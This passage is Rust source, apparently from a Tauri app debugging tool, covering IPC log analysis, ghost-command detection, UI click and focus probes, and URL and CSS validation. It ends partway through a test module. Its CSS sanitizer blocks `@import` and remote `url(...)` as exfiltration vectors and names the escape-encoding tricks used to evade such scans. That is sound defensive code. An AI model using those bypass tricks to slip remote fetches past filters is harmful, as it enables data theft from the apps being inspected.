use rmcp::model::{CallToolResult, ContentBlock};

/// Produce a properly escaped JavaScript string literal (with double quotes).
///
/// Non-ASCII characters are escaped to `\uXXXX` sequences to avoid corruption
/// in Tauri's `WebView2` eval pipeline on Windows, which mangles raw UTF-8 bytes.
pub fn js_string(s: &str) -> String {
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for ch in s.chars() {
        match ch {
            '"' => out.push_str("\\\""),
            '\\' => out.push_str("\\\\"),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            '\0' => out.push_str("\\u0000"),
            c if c.is_ascii_graphic() || c == ' ' => out.push(c),
            c => {
                for unit in c.encode_utf16(&mut [0; 2]) {
                    use std::fmt::Write;
                    let _ = write!(out, "\\u{unit:04x}");
                }
            }
        }
    }
    out.push('"');
    out
}

/// JavaScript-style truthiness for a JSON value.
///
/// Mirrors what `if (value)` would do in the webview after `eval_js`: `false`,
/// `null`, `0`, `NaN`, `""`, and (pragmatically) empty arrays/objects are falsy;
/// everything else is truthy. Used by `wait_for` with the `expression` condition.
#[must_use]
pub fn json_truthy(value: &serde_json::Value) -> bool {
    match value {
        serde_json::Value::Null => false,
        serde_json::Value::Bool(b) => *b,
        serde_json::Value::Number(n) => n.as_f64().is_some_and(|f| f != 0.0 && !f.is_nan()),
        serde_json::Value::String(s) => !s.is_empty(),
        serde_json::Value::Array(a) => !a.is_empty(),
        serde_json::Value::Object(o) => !o.is_empty(),
    }
}

/// Build the JS that projects the webview IPC log down to just command names for
/// `detect_ghost_commands`.
///
/// When `since_ms` is `Some(ms)` with `ms > 0`, only commands invoked within the
/// last `ms` milliseconds are included. This is a **non-destructive** way to scope
/// ghost detection to the current test's traffic — the alternative,
/// `logs {action:'clear'}`, wipes the session-persistent IPC ring buffer for every
/// other reader. The cutoff is evaluated in the webview's own clock (`Date.now()`),
/// so there is no Rust↔JS clock skew. A non-positive or absent `since_ms` projects
/// the whole accumulated log (the historical behavior).
#[must_use]
pub fn ghost_ipc_projection_js(since_ms: Option<i64>) -> String {
    let filter = match since_ms {
        Some(ms) if ms > 0 => format!(
            ".filter(function(c){{ return c && c.timestamp && c.timestamp >= (Date.now() - {ms}); }})"
        ),
        _ => String::new(),
    };
    format!(
        "return (window.__VICTAURI__?.getIpcLog() || []){filter}\
         .map(function(c){{ return (c && c.command) || null; }})\
         .filter(function(x){{ return x; }})"
    )
}

/// Build the JS that projects the webview IPC log down to a per-command **outcome**
/// summary for `detect_ghost_commands`: `{{ command, ok, err }}` per distinct command.
///
/// This is the basis of outcome-based ghost detection (VIC-1). A command that returned
/// success (`ok`) at least once **demonstrably has a backend handler** and can never be a
/// ghost — regardless of whether the app registered it via `#[inspectable]`. A command that
/// only ever errored with a "not found" message is a confirmed ghost. Aggregating per
/// command (not per call) keeps the payload tiny even on a busy app (the same eval-cap
/// concern that made the names-only projection necessary); the error sample is capped.
#[must_use]
pub fn ghost_ipc_outcomes_js(since_ms: Option<i64>) -> String {
    let filter = match since_ms {
        Some(ms) if ms > 0 => format!(
            ".filter(function(c){{ return c && c.timestamp && c.timestamp >= (Date.now() - {ms}); }})"
        ),
        _ => String::new(),
    };
    format!(
        "return (function() {{\
         \n  var log = (window.__VICTAURI__?.getIpcLog() || []){filter};\
         \n  var byCmd = {{}};\
         \n  for (var i = 0; i < log.length; i++) {{\
         \n    var c = log[i]; if (!c || !c.command) continue;\
         \n    var e = byCmd[c.command] || {{ command: c.command, ok: false, err: null }};\
         \n    if (c.status === 'ok') {{ e.ok = true; }}\
         \n    else if (c.status === 'error') {{\
         \n      var body = ((c.result != null ? String(c.result) : '') + ' ' + (c.error != null ? String(c.error) : ''));\
         \n      var sample = body.slice(0, 160).toLowerCase();\
         \n      /* keep the most diagnostic sample: a 'not found' error always wins over a generic one */\
         \n      if (!e.err || sample.indexOf('not found') !== -1) {{ e.err = sample; }}\
         \n    }}\
         \n    byCmd[c.command] = e;\
         \n  }}\
         \n  return Object.keys(byCmd).map(function(k) {{ return byCmd[k]; }});\
         \n}})();"
    )
}

/// A per-command IPC outcome observed in the webview log (parsed from
/// [`ghost_ipc_outcomes_js`]).
#[derive(Debug, serde::Deserialize)]
pub struct IpcOutcome {
    /// The invoked command name.
    pub command: String,
    /// `true` if the command returned success (HTTP 200) at least once → it provably has a
    /// backend handler.
    #[serde(default)]
    pub ok: bool,
    /// A lowercased sample of an error response (for not-found detection); `None` if the
    /// command never errored.
    #[serde(default)]
    pub err: Option<String>,
}

/// Tauri framework/plugin commands (e.g. `plugin:event|emit`, `plugin:updater|check`) are
/// never application-level ghosts — they are handled by Tauri or its plugins, not the app's
/// `generate_handler!`. (Victauri's own `plugin:victauri|*` traffic is already filtered out
/// at the JS layer.)
fn is_framework_builtin(name: &str) -> bool {
    name.starts_with("plugin:")
}

/// Does an error sample indicate the COMMAND has no backend handler (a true ghost)? Tauri
/// rejects an unregistered command with a "command `<name>` not found"-class message.
///
/// A bare "not found" is deliberately NOT enough — it also matches ordinary application errors
/// (e.g. a real `get_user` handler returning "user not found"), which would be a false ghost. So
/// "not found" only counts when the message also references the command (the word "command" or
/// the command name itself), matching Tauri's actual not-found format. "unknown command" /
/// "not registered" are unambiguous and match on their own. A permission failure
/// ("not allowed"/"forbidden") is intentionally NOT matched — the handler exists, it is blocked.
fn error_means_not_found(err: &str, command: &str) -> bool {
    err.contains("unknown command")
        || err.contains("not registered")
        || (err.contains("not found")
            && (err.contains("command") || err.contains(&command.to_lowercase())))
}

/// Build the enriched ghost-command report from observed IPC OUTCOMES (VIC-1).
///
/// Replaces the registry-only diff — which falsely flagged every real-but-uninstrumented
/// command (e.g. 4DA's `set_language`) and every framework builtin as a ghost — with an
/// outcome-based classification that is correct regardless of how much the app uses
/// `#[inspectable]`:
///
/// * **`confirmed_ghosts`** — invoked, never succeeded, errored "not found": real ghosts
///   (no backend handler), high confidence, registry-independent.
/// * **`verified_handlers`** — returned success at least once → a handler provably exists →
///   never flagged (this is what excludes `set_language`).
/// * **`frontend_only`** — weaker candidate tier: invoked, absent from the registry, NOT a
///   framework builtin, and never observed succeeding. Confirm against the app's
///   `generate_handler!` before treating as a bug.
/// * **`excluded_builtins`** — framework `plugin:*` commands, surfaced for transparency.
///
/// Output is additive JSON (no Rust API break); `registry_only` is unchanged.
#[must_use]
pub fn build_ghost_report(
    outcomes: &[IpcOutcome],
    registry: &victauri_core::CommandRegistry,
) -> serde_json::Value {
    use std::collections::HashSet;

    let invoked: Vec<String> = outcomes.iter().map(|o| o.command.clone()).collect();
    let handled: HashSet<&str> = outcomes
        .iter()
        .filter(|o| o.ok)
        .map(|o| o.command.as_str())
        .collect();
    let report = victauri_core::detect_ghost_commands(&invoked, registry);

    // Confirmed ghosts: never succeeded, not a framework builtin, errored "not found".
    let mut confirmed: Vec<(&str, &str)> = Vec::new();
    for o in outcomes {
        if !o.ok
            && !is_framework_builtin(&o.command)
            && let Some(err) = o.err.as_deref()
            && error_means_not_found(err, &o.command)
        {
            confirmed.push((o.command.as_str(), err));
        }
    }
    let confirmed_names: HashSet<&str> = confirmed.iter().map(|(n, _)| *n).collect();

    // Corrected `frontend_only`: registry-absent candidates, minus proven handlers, minus
    // framework builtins, minus the already-listed confirmed ghosts.
    let frontend_only: Vec<_> = report
        .frontend_only
        .iter()
        .filter(|g| {
            !handled.contains(g.name.as_str())
                && !is_framework_builtin(&g.name)
                && !confirmed_names.contains(g.name.as_str())
        })
        .cloned()
        .collect();

    let excluded_builtins: Vec<&str> = report
        .frontend_only
        .iter()
        .map(|g| g.name.as_str())
        .filter(|n| is_framework_builtin(n))
        .collect();

    let registry_total = report.total_registry_commands;
    let reliability = if registry_total > 0 { "high" } else { "low" };
    let note = format!(
        "Outcome-based ghost detection. `confirmed_ghosts` ({confirmed}) were invoked, never \
         returned success, and errored 'not found' — real missing-handler bugs, high confidence, \
         independent of the registry. `verified_handlers` ({verified}) returned success so they \
         provably HAVE a handler and are never flagged (this is why a real command such as \
         set_language is no longer a false positive). `frontend_only` ({fe}) is the weaker \
         candidate tier: invoked, never observed succeeding, not a framework builtin, and absent \
         from the introspection registry ({registry_total} known) — confirm against the app's \
         generate_handler! before filing. `excluded_builtins` are Tauri/plugin framework \
         commands, never app ghosts. The `reliability` field describes only `frontend_only`; \
         `confirmed_ghosts` is high-confidence regardless.",
        confirmed = confirmed.len(),
        verified = handled.len(),
        fe = frontend_only.len(),
    );

    serde_json::json!({
        "confirmed_ghosts": confirmed
            .iter()
            .map(|(name, error)| serde_json::json!({ "name": name, "error": error }))
            .collect::<Vec<_>>(),
        "verified_handlers": handled.len(),
        "frontend_only": frontend_only,
        "excluded_builtins": excluded_builtins,
        "registry_only": report.registry_only,
        "total_frontend_commands": report.total_frontend_commands,
        "total_registry_commands": registry_total,
        "reliability": reliability,
        "note": note,
    })
}

/// Project the webview IPC log down to `{command, duration_ms}` pairs only — never
/// the request/response bodies.
///
/// The full `getIpcLog()` carries request args + response bodies; on a heavy-traffic
/// real app that easily exceeds the eval result cap, which silently returned an empty
/// string and made `coverage`/`command_timings` report **zero** real traffic even
/// while the app was making hundreds of calls. This minimal projection stays small.
/// `since_ms` time-windows like [`ghost_ipc_projection_js`].
#[must_use]
pub fn ipc_timing_projection_js(since_ms: Option<i64>) -> String {
    let filter = match since_ms {
        Some(ms) if ms > 0 => format!(
            ".filter(function(c){{ return c && c.timestamp && c.timestamp >= (Date.now() - {ms}); }})"
        ),
        _ => String::new(),
    };
    format!(
        "return (window.__VICTAURI__?.getIpcLog() || []){filter}\
         .map(function(c){{ return (c && c.command) ? {{ command: c.command, \
         duration_ms: (typeof c.duration_ms === 'number' ? c.duration_ms : null) }} : null; }})\
         .filter(function(x){{ return x; }})"
    )
}

/// Compute per-command latency stats (count / min / max / avg / p95 ms) from raw IPC
/// `{command, duration_ms}` entries produced by [`ipc_timing_projection_js`].
///
/// Pending calls (null `duration_ms`) count toward `call_count` but not the latency
/// figures (`timed_samples` reports how many had a measured duration). Output is
/// sorted by `call_count` descending. This turns the live IPC log into a real
/// profile of the app's own frontend traffic — the data `command_timings` was blind
/// to because its counter only sees Victauri-driven `invoke_command` calls.
#[must_use]
pub fn ipc_timing_stats(entries: &[serde_json::Value]) -> Vec<serde_json::Value> {
    use std::collections::BTreeMap;
    let mut counts: BTreeMap<String, usize> = BTreeMap::new();
    let mut durations: BTreeMap<String, Vec<f64>> = BTreeMap::new();
    for e in entries {
        let Some(cmd) = e.get("command").and_then(|c| c.as_str()) else {
            continue;
        };
        *counts.entry(cmd.to_string()).or_default() += 1;
        if let Some(d) = e.get("duration_ms").and_then(serde_json::Value::as_f64) {
            durations.entry(cmd.to_string()).or_default().push(d);
        }
    }

    let mut out: Vec<serde_json::Value> = counts
        .into_iter()
        .map(|(cmd, call_count)| {
            let mut durs = durations.remove(&cmd).unwrap_or_default();
            durs.sort_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal));
            let n = durs.len();
            let (min, max, avg, p95) = if n == 0 {
                (None, None, None, None)
            } else {
                let sum: f64 = durs.iter().sum();
                let p95_idx = (((n as f64) * 0.95).ceil() as usize)
                    .saturating_sub(1)
                    .min(n - 1);
                let round1 = |v: f64| (v * 10.0).round() / 10.0;
                (
                    Some(round1(durs[0])),
                    Some(round1(durs[n - 1])),
                    Some(round1(sum / n as f64)),
                    Some(round1(durs[p95_idx])),
                )
            };
            serde_json::json!({
                "command": cmd,
                "call_count": call_count,
                "timed_samples": n,
                "min_ms": min,
                "max_ms": max,
                "avg_ms": avg,
                "p95_ms": p95,
            })
        })
        .collect();

    out.sort_by(|a, b| {
        b.get("call_count")
            .and_then(serde_json::Value::as_u64)
            .cmp(&a.get("call_count").and_then(serde_json::Value::as_u64))
    });
    out
}

/// JS projection that mines the live IPC log into a per-command **catalog** of
/// argument and result *shapes* — the data an app's `generate_handler!` set exposes
/// at runtime but `#[inspectable]`-free apps never put in the registry (4DA: 379
/// commands, every schema field null).
///
/// Shapes are inferred **in JS** and bounded (depth- and key-capped, primitives
/// reduced to their `typeof`, arrays to a single element shape) so the payload stays
/// tiny regardless of how large the real argument/result bodies are — the same
/// busy-app eval-cap failure that bit `coverage`/ghost-detection is structurally
/// avoided here (we never ship the bodies, only their structure).
///
/// Per command it captures: `call_count`, `error_count`, `last_status`, the first
/// observed `arg_shape`, and the first **successful** `result_shape` (falling back to
/// any result when no success was seen).
#[must_use]
pub fn ipc_catalog_projection_js() -> String {
    // NB: kept as one returned expression so `eval_with_return` wraps it correctly.
    "return (function(){\
        var MAXD = 5, MAXK = 60;\
        function shape(v, d){\
            if (v === null) return 'null';\
            if (v === undefined) return 'undefined';\
            if (d >= MAXD) return '\u{2026}';\
            if (Array.isArray(v)) return v.length ? { items: shape(v[0], d+1) } : 'array(empty)';\
            if (typeof v === 'object'){\
                var o = Object.create(null), n = 0;\
                for (var k in v){\
                    if (!Object.prototype.hasOwnProperty.call(v,k)) continue;\
                    if (n++ >= MAXK){ o['\u{2026}'] = 'more'; break; }\
                    o[k] = shape(v[k], d+1);\
                }\
                return o;\
            }\
            return typeof v;\
        }\
        var log = window.__VICTAURI__ && window.__VICTAURI__.getIpcLog ? (window.__VICTAURI__.getIpcLog() || []) : [];\
        var cat = Object.create(null);\
        for (var i = 0; i < log.length; i++){\
            var e = log[i]; if (!e || !e.command) continue;\
            var c = cat[e.command] || (cat[e.command] = { command: e.command, call_count: 0, error_count: 0, arg_shape: null, result_shape: null, last_status: null });\
            c.call_count++;\
            var isErr = (e.status && e.status !== 'ok') || (e.error != null);\
            if (isErr) c.error_count++;\
            c.last_status = e.status || (isErr ? 'error' : 'ok');\
            if (c.arg_shape === null && e.args !== undefined) c.arg_shape = shape(e.args, 0);\
            if (c.result_shape === null && !isErr && e.result !== undefined) c.result_shape = shape(e.result, 0);\
        }\
        for (var j = 0; j < log.length; j++){\
            var e2 = log[j]; if (!e2 || !e2.command) continue;\
            var c2 = cat[e2.command];\
            if (c2 && c2.result_shape === null && e2.result !== undefined) c2.result_shape = shape(e2.result, 0);\
        }\
        return Object.keys(cat).map(function(k){ return cat[k]; });\
    })()"
        .to_string()
}

/// Merge an IPC-derived command catalog (from [`ipc_catalog_projection_js`]) with the
/// `#[inspectable]` registry into a single, agent-facing catalog.
///
/// Every command is emitted once. IPC-observed commands carry their live
/// `call_count`/`error_count`/`last_status` and inferred `arg_shape`/`result_shape`;
/// commands known only to the registry are emitted with `observed: false` so an agent
/// still sees the full command surface. Any registry metadata (`description`,
/// `intent`, declared `args`, `return_type`) is attached when present. Sorted by
/// observed call count (busiest first), then name.
#[must_use]
pub fn merge_command_catalog(
    ipc_entries: &[serde_json::Value],
    registry: &[victauri_core::CommandInfo],
) -> Vec<serde_json::Value> {
    use std::collections::BTreeMap;

    // registry name -> info, for metadata enrichment + the unobserved tail.
    let reg: BTreeMap<&str, &victauri_core::CommandInfo> =
        registry.iter().map(|c| (c.name.as_str(), c)).collect();

    let mut out: Vec<serde_json::Value> = Vec::new();
    let mut seen: std::collections::BTreeSet<String> = std::collections::BTreeSet::new();

    for e in ipc_entries {
        let Some(name) = e.get("command").and_then(|c| c.as_str()) else {
            continue;
        };
        seen.insert(name.to_string());
        let mut entry = serde_json::json!({
            "command": name,
            "observed": true,
            "call_count": e.get("call_count").and_then(serde_json::Value::as_u64).unwrap_or(0),
            "error_count": e.get("error_count").and_then(serde_json::Value::as_u64).unwrap_or(0),
            "last_status": e.get("last_status").cloned().unwrap_or(serde_json::Value::Null),
            "arg_shape": e.get("arg_shape").cloned().unwrap_or(serde_json::Value::Null),
            "result_shape": e.get("result_shape").cloned().unwrap_or(serde_json::Value::Null),
        });
        attach_registry_metadata(&mut entry, reg.get(name).copied());
        out.push(entry);
    }

    // Registry commands never seen on the wire — still part of the command surface.
    for info in registry {
        if seen.contains(&info.name) {
            continue;
        }
        let mut entry = serde_json::json!({
            "command": info.name,
            "observed": false,
            "call_count": 0,
        });
        attach_registry_metadata(&mut entry, Some(info));
        out.push(entry);
    }

    out.sort_by(|a, b| {
        let ca = a
            .get("call_count")
            .and_then(serde_json::Value::as_u64)
            .unwrap_or(0);
        let cb = b
            .get("call_count")
            .and_then(serde_json::Value::as_u64)
            .unwrap_or(0);
        cb.cmp(&ca).then_with(|| {
            a.get("command")
                .and_then(serde_json::Value::as_str)
                .cmp(&b.get("command").and_then(serde_json::Value::as_str))
        })
    });
    out
}

/// Attach non-empty `#[inspectable]` registry metadata (description, intent, declared
/// args, return type) to a catalog entry, when the command is registered with it.
fn attach_registry_metadata(
    entry: &mut serde_json::Value,
    info: Option<&victauri_core::CommandInfo>,
) {
    let (Some(obj), Some(info)) = (entry.as_object_mut(), info) else {
        return;
    };
    if let Some(d) = &info.description {
        obj.insert("description".into(), serde_json::json!(d));
    }
    if let Some(i) = &info.intent {
        obj.insert("intent".into(), serde_json::json!(i));
    }
    if !info.args.is_empty() {
        obj.insert("declared_args".into(), serde_json::json!(info.args));
    }
    if let Some(rt) = &info.return_type {
        obj.insert("declared_return".into(), serde_json::json!(rt));
    }
}

/// The longest prefix of `s` that is at most `max_bytes` long and ends on a character
/// boundary. Byte-slicing app/page text (`&s[..n]`) panics when byte `n` falls inside a
/// multi-byte character, so every length cap on such text goes through here.
#[must_use]
pub fn truncate_at_char_boundary(s: &str, max_bytes: usize) -> &str {
    if s.len() <= max_bytes {
        return s;
    }
    let mut end = max_bytes;
    while !s.is_char_boundary(end) {
        end -= 1;
    }
    &s[..end]
}

/// Page-side probe run before trusted (OS-level) keystrokes: focus element `ref_id`, then
/// report `{found, focused}` — whether focus actually LANDED on it. OS keystrokes go to
/// whatever holds focus, and `focus()` can silently not take (a non-focusable or inert
/// element) or be moved on by a focus handler, so existence is not enough (R4-IN1).
///
/// The deep active element is followed from the top document through open shadow roots
/// (a host reports its shadow root's `activeElement`) and same-origin frames (a frame
/// element reports its document's `activeElement`). A closed shadow root or a cross-origin
/// frame cannot be looked into, so an element behind one reads as not focused.
pub fn trusted_focus_probe_js(ref_id: &str) -> String {
    format!(
        "var __e=window.__VICTAURI__&&window.__VICTAURI__.getRef({}); \
         if(!__e) return {{found:false,focused:false}}; \
         __e.focus(); \
         var __a=document.activeElement; \
         for(var __i=0;__a&&__i<64;__i++){{ \
           if(__a===__e) return {{found:true,focused:true}}; \
           var __n=null; \
           if(__a.shadowRoot&&__a.shadowRoot.activeElement){{__n=__a.shadowRoot.activeElement;}} \
           else if(__a.tagName==='IFRAME'||__a.tagName==='FRAME'){{ \
             try{{var __d=__a.contentDocument; __n=__d&&__d.activeElement;}}catch(__x){{__n=null;}} }} \
           if(!__n||__n===__a) break; \
           __a=__n; \
         }} \
         return {{found:true,focused:false}}",
        js_string(ref_id)
    )
}

/// Page-side probe run before a trusted (OS-level) click on element `ref_id`: returns the
/// click point `{x, y}` in the TOP window's viewport (CSS pixels), `{error}` when the
/// element cannot take a real click there, or `null` when the ref is unknown (R4-IN2).
///
/// A real OS click lands on whatever is on screen at the point, so the point must be one
/// where the element is actually hit: it runs the same checks as the bridge's
/// actionability check for synthetic clicks (connected, enabled, visible, non-zero size,
/// `pointer-events`, not covered at its center — the covering test is stricter: the hit
/// element must be the element or inside it) and then walks up through same-origin frames,
/// adding each frame's content offset and requiring the point to stay inside every
/// viewport on the way and the frame itself to be the element hit there. Layout is page
/// data, so the native side clamps the point to the window's client area as well.
pub fn trusted_click_probe_js(ref_id: &str) -> String {
    format!(
        "var __e=window.__VICTAURI__&&window.__VICTAURI__.getRef({}); \
         if(!__e) return null; \
         function __no(m){{return {{error:m}};}} \
         function __in(w,x,y){{return x>=0&&y>=0&&x<w.innerWidth&&y<w.innerHeight;}} \
         if(!__e.isConnected) return __no('element is detached from the DOM'); \
         __e.scrollIntoView({{block:'center',inline:'center',behavior:'instant'}}); \
         var __d=__e.ownerDocument||document, __w=__d.defaultView||window; \
         if(__e.disabled||(__e.getAttribute&&__e.getAttribute('aria-disabled')==='true')) \
           return __no('element is disabled'); \
         var __s=__w.getComputedStyle(__e); \
         if(__s.display==='none'||__s.visibility==='hidden'||parseFloat(__s.opacity)<0.01) \
           return __no('element is not visible'); \
         if(__s.pointerEvents==='none') return __no('element has pointer-events: none'); \
         var __b=__e.getBoundingClientRect(); \
         if(!(__b.width>0&&__b.height>0)) return __no('element has zero size'); \
         var __x=__b.left+__b.width/2, __y=__b.top+__b.height/2; \
         if(!__in(__w,__x,__y)) return __no('element center is outside the viewport'); \
         var __t=__d.elementFromPoint(__x,__y); \
         if(!__t||(__t!==__e&&!__e.contains(__t))) \
           return __no('element is covered at its center point'+(__t&&__t.tagName?' by <'+__t.tagName.toLowerCase()+'>':'')); \
         for(var __f=__w,__i=0;__f!==__f.top&&__i<32;__i++){{ \
           var __fe=null; try{{__fe=__f.frameElement;}}catch(__x2){{__fe=null;}} \
           if(!__fe) return __no('element is inside a cross-origin frame'); \
           var __p=__f.parent, __r=__fe.getBoundingClientRect(), __c=__p.getComputedStyle(__fe); \
           __x+=__r.left+(__fe.clientLeft||0)+(parseFloat(__c.paddingLeft)||0); \
           __y+=__r.top+(__fe.clientTop||0)+(parseFloat(__c.paddingTop)||0); \
           if(!__in(__p,__x,__y)) return __no('element center is outside the viewport (clipped by its frame)'); \
           if(__p.document.elementFromPoint(__x,__y)!==__fe) \
             return __no('the frame holding the element is covered at the click point'); \
           __f=__p; \
         }} \
         return {{x:__x, y:__y}}",
        js_string(ref_id)
    )
}

pub fn json_result(value: &impl serde::Serialize) -> CallToolResult {
    match serde_json::to_string_pretty(value) {
        Ok(json) => CallToolResult::success(vec![ContentBlock::text(json)]),
        Err(e) => tool_error(e.to_string()),
    }
}

pub fn tool_error(msg: impl Into<String>) -> CallToolResult {
    let mut result = CallToolResult::success(vec![ContentBlock::text(msg)]);
    result.is_error = Some(true);
    result
}

pub fn tool_disabled(name: &str) -> CallToolResult {
    tool_error_with_hint(
        format!("tool '{name}' is disabled by privacy configuration"),
        RecoveryHint::ReportToUser,
    )
}

#[derive(Debug, Clone, Copy)]
pub enum RecoveryHint {
    CheckInput,
    ReportToUser,
}

impl RecoveryHint {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::CheckInput => "CHECK_INPUT",
            Self::ReportToUser => "REPORT_TO_USER",
        }
    }
}

pub fn tool_error_with_hint(msg: impl Into<String>, hint: RecoveryHint) -> CallToolResult {
    let message = msg.into();
    let text = format!(
        "{message}

[hint: {}]",
        hint.as_str()
    );
    let mut result = CallToolResult::success(vec![ContentBlock::text(text)]);
    result.is_error = Some(true);
    result
}

pub fn missing_param(param: &str, action: &str) -> CallToolResult {
    tool_error_with_hint(
        format!("missing required parameter '{param}' for action '{action}'"),
        RecoveryHint::CheckInput,
    )
}

/// Validate a URL for navigation.
///
/// Only `http` and `https` schemes are allowed by default. The `file` scheme
/// is blocked unless `allow_file` is `true` (opt-in via
/// [`VictauriBuilder::allow_file_navigation`](crate::VictauriBuilder::allow_file_navigation)).
pub fn validate_url(url: &str, allow_file: bool) -> Result<(), String> {
    let trimmed: String = url.chars().filter(|c| !c.is_control()).collect();
    match url::Url::parse(&trimmed) {
        Ok(parsed) => match parsed.scheme() {
            "http" | "https" => Ok(()),
            "file" if allow_file => Ok(()),
            "file" => Err("scheme 'file' is not allowed by default; enable with \
                 VictauriBuilder::allow_file_navigation()"
                .to_string()),
            scheme => Err(format!(
                "scheme '{scheme}' is not allowed; use http or https"
            )),
        },
        Err(e) => Err(format!("invalid URL: {e}")),
    }
}

pub fn sanitize_css_color(color: &str) -> Result<String, String> {
    let s = color.trim();
    if s.len() > 100 {
        return Err("CSS color value too long".to_string());
    }
    // Reject CSS escape sequences (\XX hex escapes)
    if s.contains('\\') {
        return Err("CSS escape sequences not allowed in color values".to_string());
    }
    let valid = s
        .chars()
        .all(|c| c.is_alphanumeric() || matches!(c, '#' | '(' | ')' | ',' | '.' | ' ' | '%' | '-'));
    if !valid {
        return Err("invalid characters in CSS color value".to_string());
    }
    let lower = s.to_lowercase();
    if lower.contains("url(") || lower.contains("expression(") {
        return Err("invalid CSS color value".to_string());
    }
    Ok(s.to_string())
}

/// Strip CSS `/* ... */` comments so a scan cannot be evaded by hiding `@import`/`url(`
/// inside a comment that the browser's CSS parser ignores.
fn strip_css_comments(css: &str) -> String {
    let bytes = css.as_bytes();
    let mut out = String::with_capacity(css.len());
    let mut i = 0;
    while i < bytes.len() {
        if i + 1 < bytes.len() && bytes[i] == b'/' && bytes[i + 1] == b'*' {
            i += 2;
            while i + 1 < bytes.len() && !(bytes[i] == b'*' && bytes[i + 1] == b'/') {
                i += 1;
            }
            i = (i + 2).min(bytes.len());
        } else {
            out.push(bytes[i] as char);
            i += 1;
        }
    }
    out
}

/// Decode CSS escape sequences so an obfuscated `\40 import` / `\75 rl(` / `\2f\2f`
/// can't slip past a literal-string scan that the browser's CSS parser would still
/// decode and act on. Handles the two CSS escape forms: `\` + 1–6 hex digits
/// (optionally followed by one whitespace) → that code point, and `\` + any other
/// char → that char literally. A trailing lone `\` is dropped.
fn decode_css_escapes(css: &str) -> String {
    let mut out = String::with_capacity(css.len());
    let mut chars = css.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        // Collect up to 6 hex digits.
        let mut hex = String::new();
        while hex.len() < 6 && chars.peek().is_some_and(char::is_ascii_hexdigit) {
            hex.push(chars.next().unwrap());
        }
        if hex.is_empty() {
            // `\` + non-hex → literal next char (e.g. `\@` → `@`); lone `\` dropped.
            if let Some(next) = chars.next() {
                out.push(next);
            }
        } else {
            // One optional trailing whitespace terminates a hex escape.
            if chars.peek().is_some_and(char::is_ascii_whitespace) {
                chars.next();
            }
            match u32::from_str_radix(&hex, 16).ok().and_then(char::from_u32) {
                Some(decoded) => out.push(decoded),
                None => out.push('\u{FFFD}'),
            }
        }
    }
    out
}

/// Validate CSS submitted to `css inject` before it is added to the page. By default this
/// rejects two remote-fetch vectors that turn a debugging tool into a data-exfiltration /
/// `SSRF` channel (especially dangerous when chained with prompt injection from page-sourced
/// content): `@import` (pulls a remote stylesheet) and `url(...)` pointing at a remote
/// origin (`http(s)://`, protocol-relative `//host`, or any `scheme://`). Relative refs,
/// `data:` URIs, and `#fragment` refs are allowed. Set `allow_remote` to opt back in to
/// remote references when intentionally needed.
///
/// # Errors
/// Returns an error describing the rejected construct (or oversize input).
pub fn sanitize_injected_css(css: &str, allow_remote: bool) -> Result<(), String> {
    const MAX_CSS_LEN: usize = 256 * 1024;
    if css.len() > MAX_CSS_LEN {
        return Err(format!(
            "injected CSS too large ({} bytes, limit {MAX_CSS_LEN})",
            css.len()
        ));
    }
    if allow_remote {
        return Ok(());
    }
    // Strip comments, then DECODE escapes, then lowercase — so `\40 import` and
    // `\75 rl(` (and an escaped `\2f\2f` remote URL) are normalized to the forms
    // the scan below matches, closing the CSS-escape bypass.
    let scan = decode_css_escapes(&strip_css_comments(css)).to_ascii_lowercase();
    if scan.contains("@import") {
        return Err(
            "`@import` is blocked in injected CSS (it fetches a remote stylesheet — \
                    a data-exfiltration vector). Inline the rules, or pass `allow_remote: true`."
                .to_string(),
        );
    }
    // Inspect every `url(...)` argument for a remote target.
    let bytes = scan.as_bytes();
    let mut search_from = 0;
    while let Some(rel) = scan[search_from..].find("url(") {
        let arg_start = search_from + rel + 4;
        let arg_end = scan[arg_start..]
            .find(')')
            .map_or(scan.len(), |e| arg_start + e);
        let arg = bytes[arg_start..arg_end]
            .iter()
            .map(|&b| b as char)
            .collect::<String>();
        let trimmed = arg.trim().trim_matches(['\'', '"']).trim();
        if trimmed.starts_with("//") || trimmed.contains("://") {
            return Err(format!(
                "remote `url(...)` is blocked in injected CSS (`{}` would fetch a remote \
                 origin — a data-exfiltration vector). Use a relative or data: URL, or pass \
                 `allow_remote: true`.",
                trimmed.chars().take(80).collect::<String>()
            ));
        }
        search_from = arg_end;
    }
    Ok(())
}

#[cfg(test)]
mod json_truthy_tests {
    use super::json_truthy;
    use serde_json::json;

    #[test]
    fn falsy_values() {
        assert!(!json_truthy(&json!(null)));
        assert!(!json_truthy(&json!(false)));
        assert!(!json_truthy(&json!(0)));
        assert!(!json_truthy(&json!(0.0)));
        assert!(!json_truthy(&json!("")));
        assert!(!json_truthy(&json!([])));
        assert!(!json_truthy(&json!({})));
    }

    #[test]
    fn truthy_values() {
        assert!(json_truthy(&json!(true)));
        assert!(json_truthy(&json!(1)));
        assert!(json_truthy(&json!(-1)));
        assert!(json_truthy(&json!("ready")));
        assert!(json_truthy(&json!([1])));
        assert!(json_truthy(&json!({ "k": "v" })));
    }
}

#[cfg(test)]
mod truncate_tests {
    use super::truncate_at_char_boundary;

    #[test]
    fn a_cut_inside_a_multibyte_character_backs_off_to_its_start() {
        // `"` + 3000 × `é`: byte 4096 is the second byte of an `é`.
        let s = format!("\"{}", "é".repeat(3000));
        assert!(!s.is_char_boundary(4096));
        let cut = truncate_at_char_boundary(&s, 4096);
        assert_eq!(cut.len(), 4095);
        assert!(cut.ends_with('é'));
        // 4-byte characters, every offset.
        let emoji = "🦀".repeat(10);
        for max in 0..=emoji.len() + 2 {
            let cut = truncate_at_char_boundary(&emoji, max);
            assert!(
                cut.len() <= max && cut.len().is_multiple_of(4),
                "{max}: {}",
                cut.len()
            );
        }
    }

    #[test]
    fn short_and_ascii_text_is_unchanged_or_cut_exactly() {
        assert_eq!(truncate_at_char_boundary("abc", 10), "abc");
        assert_eq!(truncate_at_char_boundary("abcdef", 3), "abc");
        assert_eq!(truncate_at_char_boundary("", 0), "");
    }
}

#[cfg(test)]
mod ghost_projection_tests {
    use super::ghost_ipc_projection_js;

    #[test]
    fn projects_whole_log_when_since_absent() {
        let js = ghost_ipc_projection_js(None);
